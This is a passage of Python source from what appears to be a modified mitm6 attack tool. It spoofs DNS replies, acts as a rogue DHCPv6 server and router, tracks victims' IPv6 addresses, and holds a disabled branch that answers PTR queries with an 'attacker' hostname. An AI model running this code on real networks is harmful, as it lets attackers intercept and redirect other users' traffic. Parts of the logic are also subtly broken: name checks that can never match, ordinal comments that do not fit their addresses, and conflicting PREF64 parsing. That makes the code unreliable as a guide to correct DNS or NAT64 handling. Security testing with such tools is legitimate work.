                elif reqname == '248.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.248'  # Seventy-ninth IPv4 address
                elif reqname == '249.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.249'  # Eightieth IPv4 address
                elif reqname == '250.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.250'  # Eighty-first IPv4 address
                elif reqname == '251.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.251'  # Eighty-second IPv4 address
                elif reqname == '252.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.252'  # Eighty-third IPv4 address
                elif reqname == '253.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.253'  # Eighty-fourth IPv4 address
                elif reqname == '254.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.254'  # Eighty-fifth IPv4 address
                elif reqname == '255.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.255'  # Eighty-sixth IPv4 address
                else:
                    # Extract IPv4 address from the reverse lookup
                    try:
                        # Parse reverse DNS name like "170.0.0.192.in-addr.arpa."
                        parts = reqname.split('.')
                        if len(parts) >= 5 and parts[-1] == '' and parts[-2] == 'arpa' and parts[-3] == 'in-addr':
                            # Extract the 4 octets in reverse order
                            octets = parts[:-3]
                            if len(octets) == 4:
                                ipv4_addr = '.'.join(reversed(octets))
                                rdata = ipv4_addr
                            else:
                                rdata = config.selfipv4
                        else:
                            rdata = config.selfipv4
                    except:
                        rdata = config.selfipv4
            else:
                rdata = config.selfipv4
        else:
            rdata = config.selfipv4
    #AAAA request
    elif dns.qd.qtype == 28:
        # Check if this is for ipv4only.arpa (NAT64)
        if reqname.endswith('ipv4only.arpa.'):
            if config.enable_pref64:
                # For ipv4only.arpa, return the NAT64 IPv6 addresses
                # RFC 8880: encode 192.0.0.170 and 192.0.0.171 into NAT64 IPv6 addresses
                if reqname == 'ipv4only.arpa.':
                    # Return both IPv6 addresses with IPv4 encoded
                    # RFC 8880: encode 192.0.0.170 and 192.0.0.171 into NAT64 IPv6 addresses
                    ipv4_addrs = ['192.0.0.170', '192.0.0.171']
                    rdata_list = []
                    for ipv4_addr in ipv4_addrs:
                        nat64_ipv6 = encode_ipv4_to_nat64(ipv4_addr, config.nat64_prefix, config.nat64_length)
                        if nat64_ipv6:
                            rdata_list.append(nat64_ipv6)
                    if not rdata_list:
                        # Fallback if encoding fails - use single record
                        nat64_base = config.nat64_prefix.split('/')[0]
                        rdata = nat64_base
                        rdata_list = None
                elif reqname.endswith('.in-addr.arpa.'):
                    # Extract IPv4 address from reverse lookup and map to NAT64
                    try:
                        parts = reqname.split('.')
                        if len(parts) >= 5 and parts[-1] == '' and parts[-2] == 'arpa' and parts[-3] == 'in-addr':
                            octets = parts[:-3]
                            if len(octets) == 4:
                                ipv4_addr = '.'.join(reversed(octets))
                                # Use helper function to encode IPv4 to NAT64 IPv6
                                rdata = encode_ipv4_to_nat64(ipv4_addr, config.nat64_prefix, config.nat64_length)
                                if not rdata:
                                    rdata = config.selfaddr
                            else:
                                rdata = config.selfaddr
                        else:
                            rdata = config.selfaddr
                    except:
                        rdata = config.selfaddr
            else:
                rdata = config.selfaddr
        else:
            rdata = config.selfaddr
    #PTR request
    elif dns.qd.qtype == 12:
        # Check if this is for ipv4only.arpa (NAT64)
        if reqname.endswith('ipv4only.arpa.'):
            if config.enable_pref64:
                # For ipv4only.arpa PTR queries, return the domain name
                if reqname == '170.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '171.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '172.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '173.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '174.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '175.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '176.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '177.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '178.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '179.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '180.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '181.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '182.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '183.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '184.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '185.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '186.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '187.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '188.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '189.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '190.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '191.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '192.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '193.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '194.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '195.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '196.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '197.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '198.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '199.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '200.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '201.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '202.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '203.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '204.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '205.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '206.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '207.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '208.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '209.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '210.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '211.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '212.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '213.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '214.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '215.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '216.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '217.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '218.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '219.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '220.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '221.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '222.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '223.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '224.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '225.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '226.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '227.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '228.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '229.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '230.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '231.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '232.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '233.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '234.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '235.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '236.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '237.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '238.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '239.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '240.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '241.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '242.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '243.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '244.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '245.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '246.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '247.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '248.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '249.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '250.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '251.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '252.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '253.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '254.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                elif reqname == '255.0.0.192.in-addr.arpa.':
                    rdata = 'ipv4only.arpa.'
                else:
                    return
            else:
                return
        # To reply for PTR requests for our own hostname
        # comment the return statement
        return
        if reqname == config.selfptr:
            #We reply with attacker.domain
            rdata = 'attacker.%s' % config.localdomain
        else:
            return
    #TXT request (for NAT64 discovery)
    elif dns.qd.qtype == 16:
        # Check if this is for ipv4only.arpa (NAT64)
        if reqname.endswith('ipv4only.arpa.'):
            if config.enable_pref64:
                # Return NAT64 prefix information in TXT record
                rdata = '"nat64-prefix=%s"' % config.nat64_prefix
            else:
                return
        else:
            return
    elif dns.qd.qtype == 15:  # MX (Mail Exchange) record
        # Return a stock MX record: mx.mitm6.internal with preference 10
        # For MX records, we need to manually construct the rdata bytes
        # MX record format: 2 bytes preference + domain name (compressed format)
        mx_preference = 10
        mx_exchange = 'mx.mitm6.internal.'
        # Mark as MX record for special handling
        rdata = 'MX_RECORD'  # Special marker
    #Not handled
    else:
        return
    if should_spoof_dns(reqname):
        # Check if this is an MX record (type 15) - handle it specially
        if dns.qd.qtype == 15 and rdata == 'MX_RECORD':
            # Create MX record by manually constructing the rdata bytes
            # MX rdata format: preference (2 bytes, network byte order) + domain name
            mx_bytes = struct.pack('!H', mx_preference)  # 2-byte preference in network byte order
            # Add domain name in DNS label format (each label: length byte + label bytes, null-terminated)
            for label in mx_exchange.rstrip('.').split('.'):
                if label:  # Skip empty labels
                    mx_bytes += bytes([len(label)]) + label.encode('utf-8')
            mx_bytes += b'\x00'  # Null terminator for domain name
            # Create DNSRR with the manually constructed rdata bytes
            mx_rr = DNSRR(rrname=dns.qd.qname, ttl=100, rdata=mx_bytes, type=15)
            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=mx_rr)
        # Check if we have multiple records (rdata_list) or a single record (rdata)
        elif rdata_list is not None and isinstance(rdata_list, list) and len(rdata_list) > 0:
            # Build DNS response with multiple answer records
            an_list = [DNSRR(rrname=dns.qd.qname, ttl=100, rdata=rdata_val, type=dns.qd.qtype) for rdata_val in rdata_list]
            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=an_list)
        elif rdata is not None:
            # Single record response
            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=rdata, type=dns.qd.qtype))
        else:
            # No valid response data
            return
        try:
            sendp(resp, iface=config.default_if, verbose=False)
        except socket.error as e:
            print('Error sending spoofed DNS')
            print(e)
            if config.debug:
                ls(resp)
        print('Sent spoofed reply for %s to %s' % (reqname, ip.src))
        
        # Track host based on DNS traffic - add to prefix hosts if source is in our prefix
        if IPv6 in p:
            try:
                source_ipv6 = ipaddress.IPv6Address(ip.src)
                if hasattr(config, 'ipv6prefix') and config.ipv6prefix:
                    prefix_network = ipaddress.IPv6Network(config.ipv6prefix + '/64', strict=False)
                    if source_ipv6 in prefix_network:
                        # This host is using an address in our prefix - track it
                        if p.src not in pcdict:
                            pcdict[p.src] = Target(p.src, '')
                        target = pcdict[p.src]
                        # Add to SLAAC if not already tracked via DHCPv6
                        if str(source_ipv6) not in target.ipv6_dhcpv6:
                            if str(source_ipv6) not in target.ipv6_slaac:
                                target.ipv6_slaac.add(str(source_ipv6))
            except (ipaddress.AddressValueError, ValueError):
                pass
    else:
        if config.verbose or config.debug:
            print('Ignored query for %s from %s' % (reqname, ip.src))

# Helper function to check whether any element in the list "matches" value
def matches_list(value, target_list):
    testvalue = value.lower()
    for test in target_list:
        if test in testvalue:
            return True
    return False

# Should we spoof the queried name?
def should_spoof_dns(dnsname):
    # If whitelist exists, host should match
    if config.dns_whitelist and not matches_list(dnsname, config.dns_whitelist):
        return False
    # If there are any entries in the blacklist, make sure it doesnt match against any
    if matches_list(dnsname, config.dns_blacklist):
        return False
    return True

# Should we reply to this host?
def should_spoof_dhcpv6(fqdn):
    # If there is no FQDN specified, check if we should reply to empty ones
    if not fqdn:
        return not config.ignore_nofqdn
    # If whitelist exists, host should match
    if config.host_whitelist and not matches_list(fqdn, config.host_whitelist):
        if config.debug:
            print('Ignoring DHCPv6 packet from %s: FQDN not in whitelist ' % fqdn)
        return False
    # If there are any entries in the blacklist, make sure it doesnt match against any
    if matches_list(fqdn, config.host_blacklist):
        if config.debug:
            print('Ignoring DHCPv6 packet from %s: FQDN matches blacklist ' % fqdn)
        return False
    return True

# Get a target object if it exists, otherwise, create it
def get_target(p):
    mac = p.src
    # If it exists, return it
    try:
        return pcdict[mac]
    except KeyError:
        try:
            fqdn = get_fqdn(p)
        except IndexError:
            fqdn = ''
        pcdict[mac] = Target(mac,fqdn)
        return pcdict[mac]

# Parse a packet
def parsepacket(p):
    # Handle DHCPv6 traffic (only if DHCPv6 server is enabled)
    if not config.disable_dhcpv6:
        if DHCP6_Solicit in p:
            target = get_target(p)
            if should_spoof_dhcpv6(target.host):
                send_dhcp_advertise(p[DHCP6_Solicit], p, target)
        if DHCP6_Request in p:
            target = get_target(p)
            send_dhcp_reply(p[DHCP6_Request], p)
            # Track the DHCPv6 address assignment
            try:
                dhcpv6_addr = p[DHCP6OptIA_NA].ianaopts[0].addr
                target.ipv6_dhcpv6.add(dhcpv6_addr)
                print('IPv6 address %s is now assigned to %s via DHCPv6' % (dhcpv6_addr, pcdict[p.src]))
            except (IndexError, KeyError):
                print('IPv6 address assigned to %s via DHCPv6 (address parsing failed)' % pcdict[p.src])
        if DHCP6_Renew in p:
            target = get_target(p)
            try:
                if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(target.host):
                    send_dhcp_reply(p[DHCP6_Renew],p)
                    # Track the DHCPv6 address being renewed (ensure it's in the tracking set)
                    try:
                        dhcpv6_addr = p[DHCP6OptIA_NA].ianaopts[0].addr
                        target.ipv6_dhcpv6.add(dhcpv6_addr)  # Add to set (no-op if already present)
                        print('Renew reply sent to %s for %s' % (dhcpv6_addr, pcdict[p.src]))
                    except (IndexError, KeyError):
                        print('Renew reply sent to %s' % pcdict[p.src])
            except (IndexError, KeyError):
                # Some DHCPv6 packets might not have ServerId option
                pass
        
        # Handle DHCPv6 Prefix Delegation
        if DHCP6_Solicit in p and DHCP6OptIA_PD in p:
            target = get_target(p)
            if should_spoof_dhcpv6(target.host):
                send_dhcp_pd_advertise(p[DHCP6_Solicit], p, target)
        if DHCP6_Request in p and DHCP6OptIA_PD in p:
            target = get_target(p)
            send_dhcp_pd_reply(p[DHCP6_Request], p)
            print('Prefix delegation completed for %s' % pcdict[p.src])
        if DHCP6_Renew in p and DHCP6OptIA_PD in p:
            target = get_target(p)
            try:
                if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(target.host):
                    send_dhcp_pd_reply(p[DHCP6_Renew], p)
                    print('Prefix delegation renewed for %s' % pcdict[p.src])
            except (IndexError, KeyError):
                pass
    else:
        # DHCPv6 server is disabled, just log DHCPv6 packets for monitoring
        if DHCP6_Solicit in p or DHCP6_Request in p or DHCP6_Renew in p:
            if config.verbose or config.debug:
                print('DHCPv6 packet ignored (DHCPv6 server disabled): %s from %s' % (p.src, p[IPv6].src))
    
    if ARP in p:
        arpp = p[ARP]
        if arpp.op == 2:
            #Arp is-at package, update internal arp table
            arptable[arpp.hwsrc] = arpp.psrc
    if DNS in p:
        if p.dst == config.selfmac:
            send_dns_reply(p)
    
    # Handle ICMPv6 traffic
    if ICMPv6ND_RS in p:
        print('Router Solicitation from %s (%s)' % (p.src, p[IPv6].src))
        # Respond immediately with a Router Advertisement like a real router
        if not config.no_ra:
            print('  Responding with immediate Router Advertisement')
            send_ra()
    if ICMPv6ND_NS in p:
        try:
            target_addr = p[ICMPv6ND_NS].tgt
            # Check if this is a DAD (Duplicate Address Detection) packet
            # DAD packets have source address :: (unspecified) and target the address being checked
            if p[IPv6].src == '::':
                print('DAD (Duplicate Address Detection) from %s for address %s' % (p.src, target_addr))
                # This indicates a host is acquiring a new IPv6 address via SLAAC
                # Extract the target address and report it
                try:
                    # Parse the target address to determine if it's in our advertised prefix
                    target_ip = ipaddress.IPv6Address(target_addr)
                    if hasattr(config, 'ipv6prefix') and config.ipv6prefix:
                        # Create a /64 network from our prefix
                        prefix_network = ipaddress.IPv6Network(config.ipv6prefix + '/64', strict=False)
                        if target_ip in prefix_network:
                            # Check if this address is already assigned via DHCPv6 to avoid duplicates
                            if p.src not in pcdict:
                                pcdict[p.src] = Target(p.src, '')
                            
                            # Only add to SLAAC if not already in DHCPv6
                            if target_addr not in pcdict[p.src].ipv6_dhcpv6:
                                print('  SLAAC: Host %s is acquiring IPv6 address %s via SLAAC' % (p.src, target_addr))
                                pcdict[p.src].ipv6_slaac.add(target_addr)
                            else:
                                print('  DAD: Host %s checking DHCPv6 address %s (already assigned)' % (p.src, target_addr))
                        else:
                            print('  DAD: Host %s checking address %s (not in our prefix %s)' % (p.src, target_addr, prefix_network))
                    else:
                        print('  DAD: Host %s checking address %s' % (p.src, target_addr))
                except ipaddress.AddressValueError:
                    print('  DAD: Host %s checking invalid address %s' % (p.src, target_addr))
            else:
                print('Neighbour Solicitation from %s (%s) for %s' % (p.src, p[IPv6].src, target_addr))
                # Track link-local addresses from Neighbor Solicitation
                try:
                    source_ip = ipaddress.IPv6Address(p[IPv6].src)
                    if source_ip.is_link_local:
                        if p.src not in pcdict:
                            pcdict[p.src] = Target(p.src, '')
                        pcdict[p.src].ipv6_link_local.add(str(source_ip))
                except (ipaddress.AddressValueError, IndexError, KeyError):
                    pass
        except (IndexError, KeyError):
            print('Neighbour Solicitation from %s (%s)' % (p.src, p[IPv6].src))
    
    # Handle Neighbor Advertisement packets (responses to DAD)
    if ICMPv6ND_NA in p:
        try:
            target_addr = p[ICMPv6ND_NA].tgt
            # Check if this is a response to DAD (Duplicate Address Detection)
            # DAD responses typically have the S (Solicited) flag set
            if hasattr(p[ICMPv6ND_NA], 'S') and p[ICMPv6ND_NA].S:
                print('Neighbor Advertisement (DAD response) from %s (%s) for %s' % (p.src, p[IPv6].src, target_addr))
                # This confirms that the address is unique and can be used
                if p.src in pcdict:
                    target = pcdict[p.src]
                    if hasattr(target, 'ipv6_slaac') and target_addr in target.ipv6_slaac:
                        print('  SLAAC: Host %s confirmed IPv6 address %s via SLAAC' % (p.src, target_addr))
                    else:
                        print('  DAD: Host %s confirmed address %s' % (p.src, target_addr))
            else:
                print('Neighbor Advertisement from %s (%s) for %s' % (p.src, p[IPv6].src, target_addr))
                # Track link-local addresses from Neighbor Advertisement
                try:
                    source_ip = ipaddress.IPv6Address(p[IPv6].src)
                    if source_ip.is_link_local:
                        if p.src not in pcdict:
                            pcdict[p.src] = Target(p.src, '')
                        pcdict[p.src].ipv6_link_local.add(str(source_ip))
                except (ipaddress.AddressValueError, IndexError, KeyError):
                    pass
        except (IndexError, KeyError):
            print('Neighbor Advertisement from %s (%s)' % (p.src, p[IPv6].src))
    if ICMPv6ND_RA in p:
        # Check if this RA is from another device (not from us)
        if p.src != config.selfmac:
            try:
                # Extract detailed RA information
                ra_info = []
                ra_info.append('Router Advertisement from %s (%s)' % (p.src, p[IPv6].src))
                
                ra_layer = p[ICMPv6ND_RA]
                
                # Basic RA flags and parameters
                flags = []
                if hasattr(ra_layer, 'M') and ra_layer.M:
                    flags.append('M (Managed)')
                if hasattr(ra_layer, 'O') and ra_layer.O:
                    flags.append('O (Other)')
                # Check for P flag (PREF64) in RA header (RFC 8781)
                if hasattr(ra_layer, 'P') and ra_layer.P:
                    flags.append('P (PREF64)')
                if hasattr(ra_layer, 'chlim'):
                    flags.append('chlim: %d' % ra_layer.chlim)
                if hasattr(ra_layer, 'routerlifetime'):
                    flags.append('router_lifetime: %d' % ra_layer.routerlifetime)
                
                if flags:
                    ra_info.append('  Flags/Params: %s' % ', '.join(flags))
                
                # Extract options
                if hasattr(ra_layer, 'options'):
                    for opt in ra_layer.options:
                        if hasattr(opt, 'type'):
                            if opt.type == 3:  # Prefix Information
                                if hasattr(opt, 'prefix') and hasattr(opt, 'prefixlen'):
                                    ra_info.append('  Prefix: %s/%d' % (opt.prefix, opt.prefixlen))
                                    if hasattr(opt, 'preferredlifetime'):
                                        ra_info.append('    Preferred lifetime: %d' % opt.preferredlifetime)
                                    if hasattr(opt, 'validlifetime'):
                                        ra_info.append('    Valid lifetime: %d' % opt.validlifetime)
                                    if hasattr(opt, 'L') and opt.L:
                                        ra_info.append('    L flag: On-link')
                                    if hasattr(opt, 'A') and opt.A:
                                        ra_info.append('    A flag: Autonomous')
                            
                            elif opt.type == 24:  # Route Information
                                if hasattr(opt, 'prefix') and hasattr(opt, 'plen'):
                                    ra_info.append('  Route: %s/%d' % (opt.prefix, opt.plen))
                                    if hasattr(opt, 'rtlifetime'):
                                        ra_info.append('    Route lifetime: %d' % opt.rtlifetime)
                                    if hasattr(opt, 'prf'):
                                        ra_info.append('    Preference: %d' % opt.prf)
                            
                            elif opt.type == 25:  # RDNSS
                                if hasattr(opt, 'dns'):
                                    dns_servers = ', '.join(opt.dns)
                                    ra_info.append('  RDNSS: %s' % dns_servers)
                                    if hasattr(opt, 'lifetime'):
                                        ra_info.append('    Lifetime: %d' % opt.lifetime)
                            
                            elif opt.type == 26:  # DNSSL
                                if hasattr(opt, 'dnsdomains'):
                                    domains = ', '.join(opt.dnsdomains)
                                    ra_info.append('  DNSSL: %s' % domains)
                                    if hasattr(opt, 'lifetime'):
                                        ra_info.append('    Lifetime: %d' % opt.lifetime)
                            
                            elif opt.type == 5:  # MTU
                                if hasattr(opt, 'mtu'):
                                    ra_info.append('  MTU: %d' % opt.mtu)
                            
                            elif opt.type == 1:  # Source Link-Layer Address
                                if hasattr(opt, 'lladdr'):
                                    ra_info.append('  Source LL: %s' % opt.lladdr)
                            
                            elif opt.type == 38 or opt.type == 138:  # PREF64 (RFC 8781: type 38, or 0x8A/138 for compatibility)
                                # PREF64 option format (RFC 8781):
                                # - Option Type: 1 byte
                                # - Option Length: 1 byte (in units of 8 octets)
                                # - Reserved: 4 bytes
                                # - Prefix: 8 bytes (IPv6 prefix)
                                # - Prefix Length: 1 byte
                                try:
                                    # Try to get raw option data
                                    opt_data = None
                                    if hasattr(opt, 'load'):
                                        opt_data = opt.load
                                    elif hasattr(opt, 'data'):
                                        opt_data = opt.data
                                    elif hasattr(opt, '__bytes__'):
                                        # Try to get bytes representation and skip type/length header
                                        try:
                                            opt_bytes = bytes(opt)
                                            if len(opt_bytes) >= 15:  # Type(1) + Length(1) + Reserved(4) + Prefix(8) + PrefixLen(1)
                                                opt_data = opt_bytes[2:]  # Skip type and length bytes
                                        except:
                                            pass
                                    
                                    # If still no data, try to find in raw payload
                                    if opt_data is None and Raw in p:
                                        icmp_payload = p[Raw].load if Raw in p else None
                                        if icmp_payload:
                                            # Search for PREF64 option in payload (options start after 8-byte RA header)
                                            opt_type = opt.type
                                            # Start search from after RA header (8 bytes) if payload is full ICMPv6 message
                                            start_offset = 8 if len(icmp_payload) > 8 else 0
                                            i = start_offset
                                            while i < len(icmp_payload) - 1:
                                                if icmp_payload[i] == opt_type:
                                                    opt_len = icmp_payload[i + 1] * 8  # Length in units of 8 octets
                                                    if i + opt_len <= len(icmp_payload):
                                                        opt_data = icmp_payload[i+2:i+opt_len]
                                                        break
                                                # Move to next option (options are aligned to 8-byte boundaries)
                                                i += 8
                                    
                                    if opt_data and len(opt_data) >= 13:  # Minimum: 4 reserved + 8 prefix + 1 length
                                        # Skip 4 reserved bytes, then 8 bytes for prefix, then 1 byte for prefix length
                                        prefix_bytes = opt_data[4:12]  # 8 bytes for IPv6 prefix
                                        prefix_len = opt_data[12]  # 1 byte for prefix length
                                        
                                        # Convert prefix bytes to IPv6 address string
                                        try:
                                            prefix_addr = socket.inet_ntop(socket.AF_INET6, prefix_bytes)
                                            ra_info.append('  PREF64: %s/%d' % (prefix_addr, prefix_len))
                                        except (OSError, ValueError):
                                            # Fallback: display as hex
                                            prefix_hex = ':'.join(['%02x%02x' % (prefix_bytes[i], prefix_bytes[i+1]) for i in range(0, 8, 2)])
                                            ra_info.append('  PREF64: %s/%d' % (prefix_hex, prefix_len))
                                except Exception as e:
                                    if config.verbose or config.debug:
                                        ra_info.append('  PREF64: (parsing error: %s)' % str(e))
                
                # Also parse raw ICMPv6 payload directly for PREF64 options
                # (scapy might not include unknown options in ra_layer.options)
                try:
                    # Get the ICMPv6 payload - options start after the 8-byte RA header
                    icmp_payload = None
                    # Try to get bytes from the ICMPv6 layer (this gives us the full RA message)
                    try:
                        icmp_bytes = bytes(p[ICMPv6ND_RA])
                        if len(icmp_bytes) > 8:  # RA header is 8 bytes
                            icmp_payload = icmp_bytes[8:]  # Options start after 8-byte header
                    except:
                        # Fallback: try Raw layer
                        if Raw in p:
                            raw_data = p[Raw].load
                            # If Raw contains the full ICMPv6 message, skip the 8-byte RA header
                            # Otherwise assume it's just the options
                            if len(raw_data) > 8 and raw_data[0] == 134:  # ICMPv6 type 134 = RA
                                icmp_payload = raw_data[8:]
                            else:
                                icmp_payload = raw_data
                    
                    if icmp_payload:
                        # Search for PREF64 options (type 38 or 138) in the payload
                        i = 0
                        max_iterations = len(icmp_payload) // 8 + 1  # Safety limit
                        iteration = 0
                        prev_i = -1
                        while i < len(icmp_payload) - 1 and iteration < max_iterations:
                            iteration += 1
                            if i + 1 >= len(icmp_payload):
                                break
                            opt_type = icmp_payload[i] if isinstance(icmp_payload, (bytes, bytearray)) else ord(icmp_payload[i])
                            if opt_type in (38, 138):  # PREF64 option types
                                opt_len_units = icmp_payload[i + 1] if isinstance(icmp_payload, (bytes, bytearray)) else ord(icmp_payload[i + 1])
                                opt_len_bytes = opt_len_units * 8  # Length in units of 8 octets
                                if opt_len_bytes > 0 and i + opt_len_bytes <= len(icmp_payload) and opt_len_bytes >= 16:
                                    # Extract option data (skip type and length bytes)
                                    opt_data = icmp_payload[i+2:i+opt_len_bytes]
                                    if len(opt_data) >= 10:  # Minimum: 2 lifetime + 8 prefix
                                        # PREF64 format: Lifetime (2 bytes) + Prefix (8 bytes) + Padding (remaining)
                                        # NAT64 prefixes are always /96, so prefix length is not included in the option
                                        prefix_bytes = opt_data[2:10]  # 8 bytes for IPv6 prefix (skip lifetime)
                                        
                                        # Convert prefix bytes to IPv6 address string
                                        # Need to pad to 16 bytes for inet_ntop
                                        try:
                                            prefix_full = prefix_bytes + b'\x00' * 8  # Pad to 16 bytes
                                            prefix_addr = socket.inet_ntop(socket.AF_INET6, prefix_full)
